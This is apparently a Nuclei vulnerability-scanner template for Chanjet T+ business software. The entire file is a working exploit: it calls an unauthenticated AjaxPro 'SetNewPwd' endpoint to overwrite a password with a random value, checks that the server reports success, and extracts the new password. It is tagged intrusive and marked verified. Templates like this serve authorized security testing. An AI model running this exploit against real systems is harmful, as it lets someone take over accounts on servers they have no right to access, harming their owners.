http:
- body: '{"pwdNew":"{{hash}}"}

    '
  extractors:
  - dsl:
    - '"Password: " + password'
    type: dsl
  matchers:
  - part: body
    type: word
    words:
    - '{"value":true}'
  - part: header
    type: word
    words:
    - text/plain
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd'
id: chanjet-tplus-unauth-update
info:
  author: 0xr2r
  metadata:
    verified: true
  name: Chanjet Tplus Unauthorized Password Update
  reference:
  - https://cn-sec.com/archives/1377207.html
  - https://www.chanjet.com
  severity: high
  tags: tplus,unauth,chanjet,intrusive
variables:
  hash: '{{md5("{{password}}")}}'
  password: '{{randstr}}'
